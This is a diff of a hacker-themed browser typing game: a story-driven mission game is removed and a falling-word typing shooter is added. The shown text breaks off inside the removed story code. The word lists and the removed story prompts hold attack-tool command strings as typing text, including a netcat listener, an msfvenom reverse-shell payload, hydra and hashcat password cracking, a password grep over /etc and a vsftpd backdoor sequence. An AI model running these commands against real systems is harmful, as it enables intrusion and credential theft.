+<!-- PAUSE -->
+<div id="pause-overlay">
+  <div class="pause-title">// PAUSED</div>
+  <div class="pause-hint">PRESS ESC OR P TO RESUME</div>
+</div>
 
 <script>
-// ── MATRIX RAIN ──
-(function(){
-  const c=document.getElementById('matrix-canvas');
-  const resize=()=>{c.width=c.offsetWidth;c.height=c.offsetHeight;};
-  resize();window.addEventListener('resize',resize);
+// ══════════════════════════════════════════════
+//  BG MATRIX RAIN
+// ══════════════════════════════════════════════
+(()=>{
+  const c=document.getElementById('bg-canvas');
+  const resize=()=>{c.width=innerWidth;c.height=innerHeight;};
+  resize();addEventListener('resize',resize);
   const ctx=c.getContext('2d');
-  const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()[]{}<>/\\|';
+  const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*[]{}|<>/\\';
   let drops=[];
-  const tick=()=>{
-    const cols=Math.floor(c.width/13);
-    while(drops.length<cols)drops.push(Math.random()*c.height/13);
+  const frame=()=>{
+    const cols=Math.floor(c.width/14);
+    while(drops.length<cols)drops.push(Math.random()*c.height/14);
     while(drops.length>cols)drops.pop();
-    ctx.fillStyle='rgba(2,4,8,0.06)';ctx.fillRect(0,0,c.width,c.height);
-    ctx.fillStyle='#00ff88';ctx.font='12px Share Tech Mono';
+    ctx.fillStyle='rgba(2,4,8,0.055)';ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#00ff88';ctx.font='13px Share Tech Mono';
     drops.forEach((y,i)=>{
-      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*13,y*13);
-      if(y*13>c.height&&Math.random()>0.975)drops[i]=0;
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*14,y*14);
+      if(y*14>c.height&&Math.random()>0.975)drops[i]=0;
       drops[i]++;
     });
   };
-  setInterval(tick,55);
+  setInterval(frame,55);
 })();
 
-// ── NETWORK VIZ ──
-(function(){
-  const c=document.getElementById('net-canvas');
-  const resize=()=>{c.width=c.offsetWidth||200;c.height=110;};
-  resize();
-  const ctx=c.getContext('2d');
-  const nodes=Array.from({length:9},()=>({
-    x:15+Math.random()*(c.width-30),y:12+Math.random()*86,
-    vx:(Math.random()-0.5)*0.35,vy:(Math.random()-0.5)*0.35,
-    r:1.5+Math.random()*2,p:Math.random()*Math.PI*2,
-  }));
-  setInterval(()=>{
-    ctx.clearRect(0,0,c.width,c.height);
-    nodes.forEach(n=>{
-      n.x+=n.vx;n.y+=n.vy;
-      if(n.x<8||n.x>c.width-8)n.vx*=-1;
-      if(n.y<8||n.y>c.height-8)n.vy*=-1;
-      n.p+=0.04;
-    });
-    for(let i=0;i<nodes.length;i++)for(let j=i+1;j<nodes.length;j++){
-      const d=Math.hypot(nodes[i].x-nodes[j].x,nodes[i].y-nodes[j].y);
-      if(d<65){ctx.beginPath();ctx.moveTo(nodes[i].x,nodes[i].y);ctx.lineTo(nodes[j].x,nodes[j].y);ctx.strokeStyle=`rgba(0,255,136,${0.18*(1-d/65)})`;ctx.lineWidth=0.5;ctx.stroke();}
-    }
-    nodes.forEach(n=>{
-      ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);ctx.fillStyle='#00ff88';ctx.fill();
-      ctx.beginPath();ctx.arc(n.x,n.y,n.r+2+Math.sin(n.p)*1.5,0,Math.PI*2);ctx.strokeStyle=`rgba(0,255,136,${0.12+Math.sin(n.p)*0.08})`;ctx.lineWidth=0.5;ctx.stroke();
-    });
-  },50);
-})();
-
-// ── GAME STATE ──
-const G={
-  stats:{stealth:85,hacking:70,social:60,heat:5},
-  ids:5,scene:null,
-  typing:{target:'',typed:'',done:false},
-  mg:{active:false},
-  wpm:{chars:0,start:null},
-  startTime:Date.now(),
+// ══════════════════════════════════════════════
+//  WORD BANKS
+// ══════════════════════════════════════════════
+const WORDS={
+  easy:[
+    // short easy cyber words
+    'ping','scan','port','root','sudo','bash','ssh','key','vpn','dns',
+    'hash','salt','firewall','proxy','token','cert','patch','log','auth','node',
+    'host','boot','kill','grep','curl','wget','chmod','mkdir','echo','cat',
+    'user','pass','admin','login','logout','block','allow','deny','route','tcp',
+  ],
+  medium:[
+    'nmap scan','sudo bash','ssh tunnel','port 443','root shell','grep -r',
+    'chmod 777','kill -9','curl https','wget file','netstat -an','arp -a',
+    'traceroute','base64 enc','md5 hash','sha256sum','tar -xzvf','git clone',
+    'docker run','python3 -c','reverse dns','payload exe','buffer over',
+    'brute force','sql inject','xss attack','man in mid','arp poison',
+    'zero day','exploit kit','beacon ping','port sweep','ftp bounce',
+  ],
+  hard:[
+    'nmap -sV -p 1-65535','sudo chmod 4755 /bin/bash','ssh -L 8080:localhost:80',
+    'curl -X POST --data','python3 exploit.py --target','netcat -lvnp 4444',
+    'grep -rn "password" /etc/','openssl enc -aes-256-cbc','tar -czf backup.tar.gz',
+    'tcpdump -i eth0 port 80','iptables -A INPUT -j DROP','base64 -d payload.txt',
+    'john --wordlist=rockyou','hashcat -m 0 hash.txt','msfconsole -x "use exploit"',
+    'wireshark -i eth0 -k','hydra -l admin -P list','nikto -h 192.168.1.1',
+    'sqlmap -u "target?id=1"','medusa -h target -U user',
+  ],
+  elite:[
+    'nmap -sS -sV -O --script vuln','python3 -c "import socket;s=socket.socket()"',
+    'openssl s_client -connect host:443','ssh -o StrictHostKeyChecking=no user@host',
+    'iptables -t nat -A PREROUTING -p tcp','curl -sk https://target/api/v1/auth',
+    'tcpdump -i any -w capture.pcap -G 60','hydra -L users.txt -P rockyou.txt ssh',
+    'msfvenom -p linux/x64/shell_reverse_tcp','john --format=bcrypt --wordlist=dict.txt',
+    'sqlmap --level=5 --risk=3 --dbs -u URL','hashcat -a 0 -m 1800 shadow.txt dict',
+    'ncrack --user admin -P pass.txt rdp://','gobuster dir -u http://target -w list.txt',
+    'nikto -h target -ssl -port 443 -Tuning','wpscan --url target --enumerate vp,vt,u',
+  ]
 };
 
-// ── MISSION NODES ──
-const NODES=[
-  {id:'recon',  label:'RECON',        icon:'📡',st:'done'},
-  {id:'vpn',    label:'VPN TUNNEL',   icon:'🔒',st:'active'},
-  {id:'social', label:'SOCIAL ENG.',  icon:'🎭',st:'locked'},
-  {id:'breach', label:'FIREWALL',     icon:'🛡',st:'locked'},
-  {id:'extract',label:'DATA EXTRACT', icon:'💾',st:'locked'},
-  {id:'exfil',  label:'EXFIL',        icon:'🚁',st:'locked'},
-];
+// Threat categories (cosmetic labels)
+const CATEGORIES=['MALWARE','EXPLOIT','INTRUSION','PAYLOAD','ROOTKIT','BACKDOOR','RANSOMWARE','TROJAN','BOTNET','ZERO-DAY'];
 
-function renderNodes(){
-  document.getElementById('mission-map').innerHTML=NODES.map((n,i)=>`
-    ${i>0?'<div class="nc"></div>':''}
-    <div class="mn ${n.st}">
-      <div class="mi">${n.icon}</div>
-      <div class="ml ${n.st==='done'?'d':n.st==='active'?'a':''}">${n.label}</div>
-      <div class="ms" style="color:${n.st==='done'?'var(--green)':n.st==='active'?'var(--amber)':'var(--text3)'}">${n.st==='done'?'✓':n.st==='active'?'▶':'—'}</div>
-    </div>`).join('');
+// ══════════════════════════════════════════════
+//  DIFFICULTY CONFIG
+// ══════════════════════════════════════════════
+const DIFF_CFG={
+  easy:  {speed:0.012,spawnRate:3200,maxActive:4,shields:5,waveSize:8,  scoreMulti:1,  wordSet:'easy'},
+  medium:{speed:0.022,spawnRate:2400,maxActive:5,shields:4,waveSize:10, scoreMulti:1.5,wordSet:'medium'},
+  hard:  {speed:0.034,spawnRate:1800,maxActive:6,shields:3,waveSize:12, scoreMulti:2,  wordSet:'hard'},
+  elite: {speed:0.05, spawnRate:1300,maxActive:7,shields:2,waveSize:14, scoreMulti:3,  wordSet:'elite'},
+};
+
+// ══════════════════════════════════════════════
+//  GAME STATE
+// ══════════════════════════════════════════════
+let G={};
+let diff='easy';
+let hiScores={score:0,wpm:0,wave:0};
+try{const s=JSON.parse(localStorage.getItem('gp_hi')||'{}');hiScores={score:s.score||0,wpm:s.wpm||0,wave:s.wave||0};}catch(e){}
+
+function setDiff(d){
+  diff=d;
+  document.querySelectorAll('.diff-btn').forEach(b=>b.classList.remove('sel'));
+  document.getElementById('d-'+d).classList.add('sel');
 }
 
-function activateNode(id){
-  const n=NODES.find(x=>x.id===id);
-  if(!n)return;
-  const prev=NODES[NODES.indexOf(n)-1];
-  if(prev&&prev.st==='active')prev.st='done';
-  n.st='active';
-  renderNodes();
+function updateHiDisplay(){
+  document.getElementById('hi-score').textContent=hiScores.score.toLocaleString();
+  document.getElementById('hi-wpm').textContent=hiScores.wpm;
+  document.getElementById('hi-wave').textContent=hiScores.wave;
+}
+updateHiDisplay();
+
+// ══════════════════════════════════════════════
+//  START / RESTART
+// ══════════════════════════════════════════════
+function startGame(){
+  const cfg=DIFF_CFG[diff];
+  G={
+    diff,cfg,
+    score:0,wave:1,shields:cfg.shields,
+    threats:[],nextId:0,
+    typed:'',target:null,
+    combo:0,maxCombo:0,
+    totalKeys:0,correctKeys:0,
+    wpmStart:null,wpmChars:0,
+    spawnTimer:null,fallTimer:null,
+    paused:false,over:false,
+    waveKills:0,waveSize:cfg.waveSize,
+    waveSpawned:0,betweenWaves:false,
+    usedWords:new Set(),
+  };
+  show('s-game');
+  renderShields();
+  updateScore();
+  updateWave();
+  document.getElementById('hud-combo').textContent='';
+  document.getElementById('threat-field').innerHTML='';
+  document.getElementById('input-display').innerHTML='<span class="cur"></span>';
+  document.getElementById('real-input').value='';
+  document.getElementById('real-input').focus();
+  showWaveBanner(1,'WAVE 1 — INCOMING',()=>{
+    startSpawning();
+    startFalling();
+  });
 }
 
-// ── TERMINAL ──
-let tQ=[];let tBusy=false;
-function tPrint(text,cls='t-resp',delay=0){tQ.push({text,cls,delay});if(!tBusy)processQ();}
-function processQ(){
-  if(!tQ.length){tBusy=false;return;}
-  tBusy=true;
-  const {text,cls,delay}=tQ.shift();
-  setTimeout(()=>{
-    const out=document.getElementById('terminal-out');
-    const el=document.createElement('div');el.className='tl '+cls;
-    out.appendChild(el);out.scrollTop=out.scrollHeight;
-    if(cls==='t-story'||cls==='t-npc'||cls==='t-resp'){
-      let i=0;
-      const iv=setInterval(()=>{
-        el.textContent=text.slice(0,i+1);i++;
-        out.scrollTop=out.scrollHeight;
-        if(i>=text.length){clearInterval(iv);setTimeout(processQ,70);}
-      },16);
-    } else {el.textContent=text;processQ();}
-  },delay);
-}
-const tSys=t=>tPrint(t,'t-sys');
-const tStory=t=>tPrint(t,'t-story',50);
-const tNPC=(n,t)=>tPrint(`[${n}]: ${t}`,'t-npc',50);
-const tOK=t=>tPrint(t,'t-ok');
-const tErr=t=>tPrint(t,'t-err');
-const tWarn=t=>tPrint(t,'t-warn');
-const tHdr=t=>tPrint(t,'t-hdr');
-const tDiv=()=>tPrint('─'.repeat(48),'t-div');
-const tBlank=()=>tPrint('','t-sys');
+function restartGame(){show('s-title');setTimeout(startGame,50);}
+function goTitle(){show('s-title');clearTimers();}
 
-// ── LOG ──
-function addLog(msg,type='lm'){
-  const now=new Date();
-  const ts=`${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
-  const log=document.getElementById('activity-log');
-  const el=document.createElement('div');el.className='le';
-  el.innerHTML=`<span class="lt">[${ts}]</span> <span class="${type}">${msg}</span>`;
-  log.appendChild(el);log.scrollTop=log.scrollHeight;
+function clearTimers(){
+  clearInterval(G.spawnTimer);
+  clearInterval(G.fallTimer);
 }
 
-// ── STATS ──
-function setStat(name,val){
-  val=Math.max(0,Math.min(100,val));G.stats[name]=val;
-  const sv=document.getElementById('sv-'+name);
-  const sf=document.getElementById('sf-'+name);
-  if(sv)sv.textContent=val;if(sf)sf.style.width=val+'%';
-}
-function setIDS(val){
-  val=Math.max(0,Math.min(100,val));G.ids=val;
-  const f=document.getElementById('ids-fill');
-  const p=document.getElementById('ids-pct');
-  f.style.width=val+'%';p.textContent=val+'%';
-  f.style.background=val<40?'var(--green)':val<70?'var(--amber)':'var(--red)';
-  p.style.color=val<40?'var(--green)':val<70?'var(--amber)':'var(--red)';
-  const a=document.getElementById('topbar-alert');
-  if(val<30){a.textContent='THREAT: LOW';a.className='topbar-alert low';}
-  else if(val<65){a.textContent='THREAT: MED';a.className='topbar-alert med';}
-  else{a.textContent='THREAT: HIGH';a.className='topbar-alert hi';}
+// ══════════════════════════════════════════════
+//  SPAWNING
+// ══════════════════════════════════════════════
+function getWord(){
+  const pool=WORDS[G.cfg.wordSet];
+  let word,tries=0;
+  do{word=pool[Math.floor(Math.random()*pool.length)];tries++;}
+  while(G.usedWords.has(word)&&tries<30);
+  G.usedWords.add(word);
+  if(G.usedWords.size>pool.length*0.6)G.usedWords.clear();
+  return word;
 }
 
-// ── NOTIFY ──
-function notify(msg,type='info'){
-  const el=document.createElement('div');el.className=`notif ${type}`;el.textContent=msg;
-  document.getElementById('notifs').appendChild(el);
-  addLog(msg,type==='ok'?'lok':type==='bad'||type==='warn'?'lwn':'lm');
-  setTimeout(()=>el.remove(),3500);
+function spawnThreat(){
+  if(G.over||G.paused||G.betweenWaves)return;
+  if(G.threats.length>=G.cfg.maxActive)return;
+  if(G.waveSpawned>=G.waveSize)return;
+
+  const word=getWord();
+  const field=document.getElementById('threat-field');
+  const fw=field.offsetWidth;
+
+  // avoid horizontal overlap
+  const x=60+Math.random()*(fw-160);
+  const id=G.nextId++;
+  const cat=CATEGORIES[Math.floor(Math.random()*CATEGORIES.length)];
+
+  const el=document.createElement('div');
+  el.className='threat';
+  el.id='t'+id;
+  el.style.left=x+'px';
+  el.style.top='-60px';
+  el.innerHTML=`
+    <div class="threat-cat">${cat}</div>
+    <div class="threat-word"><span class="typed"></span><span class="remaining">${word}</span></div>
+    <div class="threat-bar" id="tb${id}"></div>
+  `;
+  field.appendChild(el);
+
+  G.threats.push({id,word,el,y:-60,typed:0,cat});
+  G.waveSpawned++;
 }
 
-// ── CLOCK ──
-setInterval(()=>{
-  const e=Math.floor((Date.now()-G.startTime)/1000);
-  const h=String(Math.floor(e/3600)).padStart(2,'0');
-  const m=String(Math.floor((e%3600)/60)).padStart(2,'0');
-  const s=String(e%60).padStart(2,'0');
-  document.getElementById('topbar-time').textContent=`${h}:${m}:${s}`;
-},1000);
+function startSpawning(){
+  clearInterval(G.spawnTimer);
+  G.spawnTimer=setInterval(()=>{
+    if(!G.over&&!G.paused&&!G.betweenWaves)spawnThreat();
+  },G.cfg.spawnRate);
+  // spawn first one immediately
+  setTimeout(spawnThreat,200);
+}
 
-// ── TYPING ENGINE ──
+// ══════════════════════════════════════════════
+//  FALLING + GAME LOOP
+// ══════════════════════════════════════════════
+function startFalling(){
+  clearInterval(G.fallTimer);
+  const field=document.getElementById('threat-field');
+  G.fallTimer=setInterval(()=>{
+    if(G.over||G.paused)return;
+    const fh=field.offsetHeight;
+    const speedMod=1+(G.wave-1)*0.08;
+
+    G.threats.forEach(t=>{
+      t.y+=G.cfg.speed*speedMod*16;
+      t.el.style.top=t.y+'px';
+
+      // update progress bar
+      const pct=Math.max(0,1-(t.y/fh));
+      const bar=document.getElementById('tb'+t.id);
+      if(bar){
+        bar.style.transform=`scaleX(${pct})`;
+        bar.className='threat-bar'+(pct<0.25?' urgent':pct<0.5?' warn':'');
+      }
+
+      // hit bottom
+      if(t.y>fh){
+        removeThreat(t.id,false);
+        loseShield();
+      }
+    });
+
+    // threat level
+    const maxY=G.threats.reduce((m,t)=>Math.max(m,t.y),0);
+    const tlv=Math.min(100,Math.round((maxY/fh)*100));
+    const tf=document.getElementById('threat-fill');
+    tf.style.width=tlv+'%';
+    tf.style.background=tlv>70?'var(--red)':tlv>40?'var(--amber)':'var(--green)';
+
+    // auto-target closest untyped threat
+    if(!G.target||!G.threats.find(t=>t.id===G.target)){
+      autoTarget();
+    }
+
+    // check wave complete
+    if(G.waveSpawned>=G.waveSize&&G.threats.length===0&&!G.betweenWaves){
+      waveComplete();
+    }
+  },16);
+}
+
+function autoTarget(){
+  // find closest threat to bottom that starts with current typed chars
+  const typed=G.typed.toLowerCase();
+  let best=null,bestY=-Infinity;
+  G.threats.forEach(t=>{
+    if(t.word.toLowerCase().startsWith(typed)&&t.y>bestY){
+      best=t;bestY=t.y;
+    }
+  });
+  if(best&&best.id!==G.target){
+    // un-highlight old
+    if(G.target){
+      const old=G.threats.find(t=>t.id===G.target);
+      if(old)old.el.classList.remove('targeted');
+    }
+    G.target=best.id;
+    best.el.classList.add('targeted');
+  }
+}
+
+// ══════════════════════════════════════════════
+//  INPUT
+// ══════════════════════════════════════════════
 const realInput=document.getElementById('real-input');
-document.addEventListener('click',()=>{if(!G.mg.active)realInput.focus();});
-realInput.addEventListener('input',handleTyping);
+document.addEventListener('click',()=>{if(!G.over&&!G.paused)realInput.focus();});
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'||e.key==='p'||e.key==='P'){togglePause();}
+});
+realInput.addEventListener('input',handleInput);
 
-function setTarget(kw,hint){
-  G.typing={target:kw.toLowerCase(),typed:'',done:false};
-  const hEl=document.getElementById('hint-txt');
-  hEl.innerHTML=hint?`COMMAND: <span>${hint}</span>`:'TYPE COMMAND TO PROCEED';
-  renderTDisp('');realInput.value='';realInput.focus();
-}
+function handleInput(){
+  if(G.over||G.paused||G.betweenWaves)return;
+  const raw=realInput.value.toLowerCase();
+  realInput.value='';
 
-function renderTDisp(typed){
-  const target=G.typing.target;
-  const d=document.getElementById('tdisp');
-  if(!target){d.innerHTML='<span class="cur"></span>';return;}
-  let h='';
-  for(let i=0;i<target.length;i++){
-    if(i<typed.length){
-      h+=typed[i]===target[i]?`<span class="cc">${target[i]}</span>`:`<span class="cw">${target[i]}</span>`;
-    } else {
-      if(i===typed.length)h+='<span class="cur"></span>';
-      h+=`<span class="cp">${target[i]}</span>`;
+  if(!G.wpmStart&&raw.length>0)G.wpmStart=Date.now();
+
+  // find target: threat whose word starts with raw
+  const match=findMatch(raw);
+  if(match){
+    G.target=match.id;
+    G.threats.forEach(t=>t.el.classList.remove('targeted'));
+    match.el.classList.add('targeted');
+    G.typed=raw;
+    G.totalKeys+=raw.length>G.typed.length?raw.length-G.typed.length:1;
+    G.correctKeys+=raw.length>G.typed.length?raw.length-G.typed.length:1;
+    updateThreatDisplay(match);
+    updateInputDisplay(raw,match.word);
+    if(G.wpmStart){
+      G.wpmChars=G.correctKeys;
+      const mins=(Date.now()-G.wpmStart)/60000;
+      if(mins>0.01)document.getElementById('hud-wpm').textContent='WPM: '+Math.round((G.wpmChars/5)/mins);
+    }
+    // check complete
+    if(raw===match.word.toLowerCase()){
+      killThreat(match);
+    }
+  } else {
+    // wrong key
+    G.totalKeys++;
+    G.combo=0;
+    document.getElementById('hud-combo').textContent='';
+    flashMiss();
+    // clear typed if no match at all
+    if(raw.length===1){G.typed='';updateInputDisplay('',null);}
+    else{
+      // backspace-like: try shorter
+      const shorter=raw.slice(0,-1);
+      const m2=findMatch(shorter);
+      if(m2){G.typed=shorter;updateInputDisplay(shorter,m2.word);}
+      else{G.typed='';updateInputDisplay('',null);}
     }
   }
-  if(typed.length>=target.length)h+='<span class="cur"></span>';
+}
+
+function findMatch(str){
+  if(!str)return null;
+  // prefer currently targeted
+  if(G.target){
+    const cur=G.threats.find(t=>t.id===G.target);
+    if(cur&&cur.word.toLowerCase().startsWith(str))return cur;
+  }
+  // find any matching, prefer lowest (closest to bottom)
+  let best=null,bestY=-Infinity;
+  G.threats.forEach(t=>{
+    if(t.word.toLowerCase().startsWith(str)&&t.y>bestY){best=t;bestY=t.y;}
+  });
+  return best;
+}
+
+function updateThreatDisplay(t){
+  const typed=G.typed;
+  const word=t.word;
+  const wordEl=t.el.querySelector('.threat-word');
+  wordEl.innerHTML=`<span class="typed">${word.slice(0,typed.length)}</span><span class="remaining">${word.slice(typed.length)}</span>`;
+}
+
+function updateInputDisplay(typed,word){
+  const d=document.getElementById('input-display');
+  if(!typed){d.innerHTML='<span class="cur"></span>';return;}
+  let h='';
+  if(word){
+    for(let i=0;i<typed.length;i++){
+      h+=typed[i]===word[i]?`<span class="ic">${typed[i]}</span>`:`<span class="iw">${typed[i]}</span>`;
+    }
+  } else {
+    for(let i=0;i<typed.length;i++)h+=`<span class="iw">${typed[i]}</span>`;
+  }
+  h+='<span class="cur"></span>';
   d.innerHTML=h;
 }
 
-function handleTyping(){
-  if(G.mg.active)return;
-  const raw=realInput.value.toLowerCase();
-  const target=G.typing.target;
-  if(!target)return;
-  if(raw.length>target.length){realInput.value=raw.slice(0,target.length);return;}
-  G.typing.typed=raw;renderTDisp(raw);
-  if(!G.wpm.start&&raw.length>0)G.wpm.start=Date.now();
-  G.wpm.chars=raw.length;
-  if(G.wpm.start){
-    const mins=(Date.now()-G.wpm.start)/60000;
-    const w=mins>0.01?Math.round((G.wpm.chars/5)/mins):0;
-    document.getElementById('wpm-val').textContent=w||'—';
+// ══════════════════════════════════════════════
+//  KILL / REMOVE
+// ══════════════════════════════════════════════
+function killThreat(t){
+  // score
+  const wordLen=t.word.length;
+  const speedBonus=Math.round(t.y/5);
+  const comboBonus=G.combo*10;
+  const pts=Math.round((wordLen*15+speedBonus+comboBonus)*G.cfg.scoreMulti);
+  G.score+=pts;
+  G.combo++;
+  if(G.combo>G.maxCombo)G.maxCombo=G.combo;
+  G.waveKills++;
+
+  // combo display
+  if(G.combo>=3){
+    document.getElementById('hud-combo').textContent=`x${G.combo} COMBO`;
+    spawnComboPopup(pts,t.el);
+  } else {
+    document.getElementById('hud-combo').textContent='';
   }
-  if(raw===target){
-    G.typing.done=true;realInput.value='';G.typing.typed='';renderTDisp('');
-    tPrint(`> ${target}`,'t-prompt');tBlank();
-    G.wpm={chars:0,start:null};document.getElementById('wpm-val').textContent='—';
-    onCmd(target);
-  }
+
+  // boom effect
+  const rect=t.el.getBoundingClientRect();
+  spawnBoom(rect.left+rect.width/2,rect.top+rect.height/2);
+
+  removeThreat(t.id,true);
+  G.typed='';G.target=null;
+  updateInputDisplay('',null);
+  updateScore();
+
+  // update accuracy
+  const acc=G.totalKeys>0?Math.round((G.correctKeys/G.totalKeys)*100):100;
+  document.getElementById('acc-val').textContent=acc+'%';
 }
 
-// ── CHOICES ──
-function showChoices(arr){
-  const el=document.getElementById('choices');el.innerHTML='';
-  arr.forEach(c=>{
-    const btn=document.createElement('button');btn.className='ch'+(c.locked?' locked':'');
-    btn.innerHTML=`${c.label}${c.locked?`<span class="req">[${c.req}]</span>`:''}`;
-    if(!c.locked)btn.onclick=()=>{hideChoices();setTarget('','');tPrint(`> ${c.label}`,'t-prompt');c.go();};
-    el.appendChild(btn);
-  });
-  el.classList.add('show');
-}
-function hideChoices(){const el=document.getElementById('choices');el.classList.remove('show');el.innerHTML='';}
-
-// ── MINI-GAME ──
-function startMG(cfg){
-  G.mg={active:true,prompts:cfg.prompts,idx:0,correct:0,start:Date.now(),timer:null,onDone:cfg.onDone,onFail:cfg.onFail,limit:cfg.limit||50};
-  const ov=document.getElementById('mg-overlay');ov.classList.add('show');
-  document.getElementById('mg-title').textContent=cfg.title||'BREACH IN PROGRESS';
-  document.getElementById('mg-inst').textContent=cfg.inst||'Type each command exactly as shown.';
-  loadMGP();
-  const inp=document.getElementById('mg-input');inp.value='';inp.className='';inp.oninput=handleMGI;inp.focus();
-  let rem=G.mg.limit;document.getElementById('mg-timer').textContent=rem+'s';
-  G.mg.timer=setInterval(()=>{rem--;document.getElementById('mg-timer').textContent=rem+'s';if(rem<=0){clearInterval(G.mg.timer);endMG(false);}},1000);
+function removeThreat(id,killed){
+  const idx=G.threats.findIndex(t=>t.id===id);
+  if(idx===-1)return;
+  const t=G.threats[idx];
+  t.el.remove();
+  G.threats.splice(idx,1);
+  if(G.target===id){G.target=null;G.typed='';updateInputDisplay('',null);}
 }
 
-function loadMGP(){
-  const mg=G.mg,p=mg.prompts[mg.idx];
-  renderMGP('');
-  document.getElementById('mg-input').value='';document.getElementById('mg-input').className='';
-  document.getElementById('mg-pfill').style.width=(mg.idx/mg.prompts.length*100)+'%';
+// ══════════════════════════════════════════════
+//  SHIELDS / DAMAGE
+// ══════════════════════════════════════════════
+function loseShield(){
+  if(G.over)return;
+  G.shields=Math.max(0,G.shields-1);
+  G.combo=0;document.getElementById('hud-combo').textContent='';
+  renderShields();
+  flashMiss();
+  if(G.shields<=0)gameOver();
 }
 
-function renderMGP(typed){
-  const target=G.mg.prompts[G.mg.idx];
-  const el=document.getElementById('mg-prompt');
-  let h='';
-  for(let i=0;i<target.length;i++){
-    if(i<typed.length){
-      h+=`<span style="color:${typed[i]===target[i]?'var(--green)':'var(--red)'}">${target[i]===' '?'&nbsp;':target[i]}</span>`;
-    } else {
-      if(i===typed.length)h+=`<span style="background:var(--green);color:var(--bg);border-radius:1px;">&nbsp;</span>`;
-      h+=`<span style="color:var(--text3)">${target[i]===' '?'&nbsp;':target[i]}</span>`;
-    }
-  }
-  el.innerHTML=h;
-}
-
-function handleMGI(){
-  if(!G.mg.active)return;
-  const inp=document.getElementById('mg-input'),typed=inp.value,target=G.mg.prompts[G.mg.idx];
-  renderMGP(typed);
-  const mins=(Date.now()-G.mg.start)/60000;
-  if(mins>0.01){
-    const total=G.mg.prompts.slice(0,G.mg.idx).join('').length+typed.length;
-    document.getElementById('mg-wpm').textContent=`WPM: ${Math.round((total/5)/mins)}`;
-  }
-  let err=false;
-  for(let i=0;i<typed.length;i++)if(typed[i]!==target[i]){err=true;break;}
-  inp.className=err?'err':'';
-  if(typed===target){
-    G.mg.correct++;G.mg.idx++;inp.className='ok2';
-    if(G.mg.idx>=G.mg.prompts.length){setTimeout(()=>endMG(true),300);}
-    else{setTimeout(()=>{inp.value='';inp.className='';loadMGP();},200);}
+function renderShields(){
+  const el=document.getElementById('hud-shields');
+  el.innerHTML='';
+  for(let i=0;i<G.cfg.shields;i++){
+    const pip=document.createElement('div');
+    pip.className='shield-pip'+(i>=G.shields?' dead':'');
+    el.appendChild(pip);
   }
 }
 
-function endMG(ok){
-  clearInterval(G.mg.timer);G.mg.active=false;
-  document.getElementById('mg-overlay').classList.remove('show');
-  realInput.focus();
-  if(ok)G.mg.onDone&&G.mg.onDone();
-  else G.mg.onFail&&G.mg.onFail();
-}
+// ══════════════════════════════════════════════
+//  WAVE SYSTEM
+// ══════════════════════════════════════════════
+function waveComplete(){
+  if(G.betweenWaves||G.over)return;
+  G.betweenWaves=true;
+  clearInterval(G.spawnTimer);
 
-// ── COMMAND ROUTER ──
-function onCmd(cmd){
-  hideChoices();
-  if(cmd==='connect --vpn')return runVPN();
-  if(G.scene==='ssh'&&cmd==='ssh analyst@10.0.8.52 -p 2222')return runSSHConnected();
-  if(G.scene==='vault')return runExtraction();
-}
+  // shield bonus
+  const shieldBonus=G.shields*200;
+  G.score+=shieldBonus;
+  updateScore();
 
-// ══════════════════════════════════════════════════════
-//  STORY SCENES
-// ══════════════════════════════════════════════════════
-
-function runIntro(){
-  G.scene='intro';
-  tHdr('// OPERATION: BLACKVAULT — BRIEFING');
-  tSys('Secure channel: AES-256 ✓  |  Anonymizer: 4-hop ✓  |  Trace: Clean ✓');tBlank();
-  tStory('You are GHOST. Freelance penetration tester. Black-hat turned consultant.');
-  tStory('Your client: a whistleblower inside NovaCorp, a data-broker megacorp worth $14 billion.');
-  tStory('Your target: BLACKVAULT — an internal server array holding encrypted financial ledgers that implicate the board in a $400M fraud.');tBlank();
-  tNPC('HANDLER','We have an asset on the inside. They left a service port open — but it closes at 05:00. You have the window. Use it.');
-  tNPC('HANDLER','Three security layers. VPN bypass, social engineering, then the firewall itself. Don\'t get greedy.');tBlank();
-  tSys('Initialize connection to target network:');
-  setTimeout(()=>setTarget('connect --vpn','Type: connect --vpn'),2500);
-  addLog('Briefing received','lok');
-}
-
-function runVPN(){
-  tBlank();tOK('>> VPN TUNNEL ESTABLISHED');
-  tSys('Route: Tokyo → Frankfurt → São Paulo → NovaCorp DMZ');
-  tSys('IP masked. Fingerprint randomized. Packet timing randomized.');tBlank();
-  tStory('You\'re inside NovaCorp\'s DMZ. Three potential entry points appear on your scanner.');
-  tStory('A legacy FTP service on port 21 — unpatched. A hidden SSH endpoint on 2222. And a web-based employee portal with a helpdesk ticketing system.');tBlank();
-  tNPC('HANDLER','Their IDS is pattern-based. Stay varied. Pick your angle.');tBlank();
-  setStat('stealth',90);setIDS(12);notify('VPN active','ok');addLog('DMZ accessed','lok');
-  activateNode('social');
-  setTimeout(()=>{
-    showChoices([
-      {label:'[1] EXPLOIT LEGACY FTP SERVICE',go:runFTP},
-      {label:'[2] PROBE HIDDEN SSH ENDPOINT',go:runSSH},
-      {label:'[3] SOCIAL ENGINEER THE HELPDESK',go:runSocial},
-    ]);
-  },1200);
-}
-
-function runFTP(){
-  tBlank();tHdr('// EXPLOIT: LEGACY FTP — PORT 21');
-  tStory('Classic negligence. The FTP service is running vsftpd 2.3.4 — a version with a well-documented backdoor planted by an attacker back in 2011. If NovaCorp never patched this, you\'re straight in.');
-  tSys('Probing port 21...');tBlank();
-  startMG({
-    title:'// FTP BACKDOOR EXPLOITATION',
-    inst:'Execute the exploit sequence. Type each command exactly — precision matters. One bad character triggers the IDS.',
-    prompts:[
-      'nmap -sV -p 21 192.168.10.5',
-      'ftp 192.168.10.5 6200',
-      'USER :)',
-      'PASS anonymous',
-      'ls -la /srv/internal/',
-    ],
-    limit:60,
-    onDone:()=>{
-      tBlank();tOK('>> BACKDOOR CONFIRMED. FTP SESSION OPEN.');
-      tSys('vsftpd 2.3.4 — unpatched since 2011. Textbook negligence.');
